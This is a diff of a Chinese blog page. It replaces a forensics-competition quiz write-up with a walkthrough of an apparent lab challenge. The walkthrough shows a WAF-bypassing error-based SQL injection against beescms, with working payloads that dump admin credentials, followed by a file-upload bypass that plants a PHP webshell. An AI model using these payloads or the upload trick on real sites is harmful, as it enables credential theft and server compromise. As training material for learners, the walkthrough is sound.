@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>2018年美亚杯团赛A部分:Linux取证 | Getuid</title>
+  <title>sql注入-绕过防护getshell | Getuid</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -177,105 +177,80 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2021-11-05T03:40:09.000Z" itemprop="datePublished">
-          2021-11-05
+      <time datetime="2021-11-28T15:20:16.000Z" itemprop="datePublished">
+          2021-11-28
       </time>
     
     
     | 
-    <a href='/tags/美亚取证/'>美亚取证</a>,
-    
-    <a href='/tags/Linux/'>Linux</a>
+    <a href='/tags/web/'>web</a>
     
     
 </span>
-                <h1>2018年美亚杯团赛A部分:Linux取证</h1>
+                <h1>sql注入-绕过防护getshell</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>Linux取证</p>
-<h4><span id="a部分">A部分</span></h4><p><img src="image-20211031094059974.png" alt="image-20211031094059974"></p>
-<p>“美亚杯”第四届中国电子数据取证竞赛-团体赛<br>本次比赛共1 个章节, 120 个小题, 比赛时长300 分钟, 总共120分<br>单项选择</p>
-<ol>
-<li><p>[单选题] 第A部份 (第 1 至 12 题) : 根据镜像文件 “c2server.E01” 的内容，回答关于黑客控制的命令服务器(C&amp;C服务器)的问题。 </p>
-<p>1.黑客控制的命令服务器(C&amp;C服务器)是什么版本的系统? (1分)<br>A. CentOS 7<br>B. CentOS 6<br>C. Ubuntu 18.04<br>D. Ubuntu 16.04<br>E. Ubuntu 14.04<br> 标记本题</p>
-<p>D</p>
-<p><img src="image-20211101141903541.png" alt="image-20211101141903541"></p>
-</li>
-<li><p>[单选题] 2.该C&amp;C服务器 /dev/sda1 的通用唯一标识符 (UUID) 是什么? (1分)<br>A. a69c799c-7f0e-4191-9748-66a7e6bc37ad<br>B. 35a727cd-4440-438f-b3dd-0f82d37f8c0e<br>C. ec593f12-e418-492d-97af-b804b8208d99<br>D. 4fce5b91-e899-4807-882f-78c9bcfa66e5<br>E. 07febb97-674c-4cae-803c-19ce92024ce<br> 标记本题</p>
-<p>C</p>
+      		<h1><span id="sql注入-绕过防护getshell">sql注入-绕过防护getshell</span></h1><p>尤里的复仇Ⅱ 回归</p>
 <blockquote>
-<p>直接在取证大师中搜索相关的配置文件，在etc文件夹中搜索fstab,在这个配置文件中找到UUID</p>
-</blockquote>
-<p><img src="image-20211101144122030.png" alt="image-20211101144122030"></p>
-</li>
-<li><p>[单选题] 3.系统的时区设定是什么? (1分)<br>A. Asia/Macao<br>B. Asia/Hong_Kong<br>C. Hongkong<br>D. GMT<br>E. Etc/GMT+8<br> 标记本题</p>
-<p>B</p>
-<p><img src="image-20211101144143722.png" alt="image-20211101144143722"></p>
-</li>
-<li><p>[单选题] 4.黑客曾上传受害公司荣科数码(RKD)文件到C&amp;C服务器，上传方式包括: (i)ftp (ii)ssh (iii)telnet (1分)<br>A. (i)<br>B. (ii)<br>C. (iii)<br>D. (i) and (ii)<br>E. (ii) and (iii)<br> 标记本题</p>
-<p>A</p>
+<p>Tips:</p>
 <blockquote>
-<p>我们将镜像仿真起来，可以利用FTK先挂载，然后创建相应的虚拟机，也可以用仿影，稍微快一点，然后准备绕过密码单用户登录，进入目标系统查看历史操作(用root权限)history，发现有ftp的相关信息，再查看开放的端口netstat -lntp<br>发现只开放了21端口。</p>
+<p>这天，在朋友的介绍下，他受邀测试了某集团的网站，在签完授权合同后，他平复下激动的心情，找到漏洞所在点，祭出神器，结果……<br>他发现有拦截，于是开始放下工具，学习如何绕狗……<br>最终，他成功完成了这次任务</p>
+<p>一个基础的绕过，感受下绕过的逻辑</p>
 </blockquote>
-<p><img src="image-20211101144635623.png" alt="image-20211101144635623"></p>
-<p><img src="image-20211101145012517.png" alt="image-20211101145012517"></p>
-<blockquote>
-<p>然后根据这个线索在取证大师中查找FTP的日志文件，进行验证<br>/var/log/transfer.log<br>导出分析<br>发现有很多FTP上传信息，验证成功</p>
 </blockquote>
-<p><img src="image-20211101145633185.png" alt="image-20211101145633185"></p>
-</li>
-<li><p>[单选题] 5.黑客曾使用哪一个文件传输协议(FTP)服务账户，用作登入C&amp;C服务器上传档案? (1分)<br>A. upload<br>B. C&amp;C<br>C. ftpuser<br>D. root<br>E. rdkuser<br> 标记本题</p>
-<p>A</p>
-<p><img src="image-20211101145653822.png" alt="image-20211101145653822"></p>
-</li>
-<li><p>[单选题] 6.接上题，C&amp;C服务器中使用了哪个系统账户用作使用文件传输协议(FTP)服务? (1分)<br>A. upload<br>B. C&amp;C<br>C. ftpuser<br>D. root<br>E. rdkuser<br> 标记本题</p>
-<p>C</p>
-<blockquote>
-<p>我们可以查看系统的操作历史记录，可以在仿真之后直接history<br>也可以在取证大师中的/root/.bash.history<br>查看命令日志<br>发现黑客将ftpuser执行了useradd 添加到了用户组，然后再…..</p>
-</blockquote>
-<p><img src="image-20211101150547137.png" alt="image-20211101150547137"></p>
-</li>
-<li><p>[单选题] 7. 根据黑客上传的档案，你能找到荣科数码路由器的物理地址(Mac Address)是什么? (1分)<br>A. A0:B4:A5:E6:86:23<br>B. EC:1A:59:50:F9:02<br>C. 74:EA:3A:A3:0D:46<br>D. 8C:0D:76:B0:69:5C<br>E. 14:91:82:73:6D:FD<br> 标记本题</p>
-<p>C</p>
-<blockquote>
-<p>根据他FTP日志，发现他上传的档案在/home/c2/FTP<br>在这个文件夹中，可以发现黑客传的一个ip.txt<br>在这里边找到路由器的默认网关<br>再在arp.txt （一个ip与mac地址对应关系的文档）<br>找到这个默认网关对应的mac地址</p>
-</blockquote>
-<p><img src="image-20211101152220161.png" alt="image-20211101152220161"></p>
-<p><img src="image-20211101152253247.png" alt="image-20211101152253247"></p>
-</li>
-<li><p>[单选题] 8.黑客在使用什么软件以暴力破解法取得 Wifi的密码? (1分)<br>A. Wireshark<br>B. Fern WiFi Wireless Cracker<br>C. Kismet<br>D. Aircrack-ng<br>E. WepAttack<br> 标记本题</p>
-<p>D</p>
-<p><img src="image-20211101152509554.png" alt="image-20211101152509554"></p>
-</li>
-<li><p>[单选题] 9.黑客在什么时候将网络摄录镜头的配置文件cam_config_backup.bin上载到C&amp;C服务器? （答案格式 －“本地时间＂：YYYY-MM-DD HH:MM:SS +8） (1分)<br>A. 2018-11-01 15:13:17 +8<br>B. 2018-11-01 17:14:26 +8<br>C. 2018-11-01 17:18:07 +8<br>D. 2018-11-01 17:18:24 +8<br>E. 2018-11-01 17:18:28 +8<br> 标记本题</p>
-<p>D</p>
-<blockquote>
-<p>查看FTP日志/var/log/transfer.log</p>
-</blockquote>
-<p><img src="image-20211101153329497.png" alt="image-20211101153329497"></p>
-</li>
-<li><p>[单选题] 10.哪一个网络地址(IP Address)可追查黑客的位置? (1分)<br>A. 192.168.7.12<br>B. 218.255.242.113<br>C. 218.255.242.117<br>D. 220.246.55.13<br>E. 220.246.55.160<br> 标记本题</p>
-<p>E</p>
-<blockquote>
-<p>同样是FTP文件地址</p>
-</blockquote>
-<p><img src="image-20211101153623896.png" alt="image-20211101153623896"></p>
-</li>
-</ol>
+<h2><span id="信息搜集">信息搜集</span></h2><p>访问网站，查询网站指纹beescms，网上搜漏洞，找到sql注入存在的后台</p>
+<p><img src="image-20211129010743877.png" alt="image-20211129010743877"></p>
+<h2><span id="绕过防护报错注入">绕过防护报错注入</span></h2><p>用户名等于1’，提示数据库报错，存在注入点。</p>
+<p><img src="image-20211128232424908.png" alt="image-20211128232424908"></p>
+<p>祭出burpsuite进行报错注入</p>
+<p>根据回显很清楚的判断出存在敏感信息过滤，双写入绕过</p>
+<p>暴库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(0x7e,(sselectelect database()),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211129011324097.png" alt="image-20211129011324097"></p>
+<p><strong>bees</strong></p>
+<p>暴表</p>
+<p><img src="image-20211129011719678.png" alt="image-20211129011719678"></p>
+<p>这里把where给过滤了，绕过<strong>wh+where+ere</strong></p>
+<p>等于号用like代替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(0x7e,(sselectelect group_concat(table_name) fr+from+om information_schema.tables wh+where+ere table_schema like&#x27;bees&#x27;),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211129012330646.png" alt="image-20211129012330646"></p>
+<p><strong>‘~bees_admin,bees_admin_group,bee’</strong></p>
+<p>暴字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(0x7e,(sselectelect group_concat(column_name) fr+from+om information_schema.columns wh+where+ere table_name like&#x27;bees_admin&#x27;),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211129012444584.png" alt="image-20211129012444584"></p>
+<p>‘~id,admin_name,admin_password,ad’</p>
+<p>暴数据</p>
+<p>提示只能显示一行的数据，需要加上limit 1 做限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(0x7e,(sselectelect admin_name fr+from+om bees_admin limit 1),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(0x7e,(sselectelect admin_password fr+from+om bees_admin limit 1),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211129014241443.png" alt="image-20211129014241443"><img src="image-20211129014444936.png" alt="image-20211129014444936"></p>
+<p>账号：admin</p>
+<p>密码：21232f297a57a5a743894a0e4a801fc</p>
+<p>网上解码的密码为admin</p>
+<h2><span id="登入后台getshell">登入后台getshell</span></h2><p><img src="image-20211129014706902.png" alt="image-20211129014706902"></p>
+<p>发现有文件上传漏洞</p>
+<p><img src="image-20211129020926918.png" alt="image-20211129020926918"></p>
+<p>上传图片马，修改后缀名为php绕过前端检验</p>
+<p><img src="image-20211129021016894.png" alt="image-20211129021016894"></p>
+<p>点击上传了的图片解析一句话木马</p>
+<p><img src="image-20211129021143048.png" alt="image-20211129021143048"></p>
+<p>用菜刀连接拿到shell，然后找到flag</p>
+<p><img src="image-20211129021216595.png" alt="image-20211129021216595"></p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
-    <a class="pull-left" href="/2021/11/11/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-kioptrix-level1/" style="float: left;">
-        ← kali渗透测试:kioptrix level1
-    </a>
     
-    
-    <a class="pull-right" href="/2021/11/05/2018%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E8%B5%9BB%E9%83%A8%E5%88%86-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/">
-        2018年美亚杯团赛B部分:计算机取证 →
+    <a class="pull-right" href="/2021/11/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+        记一次简单的信息搜集 →
     </a>
     
 </nav>
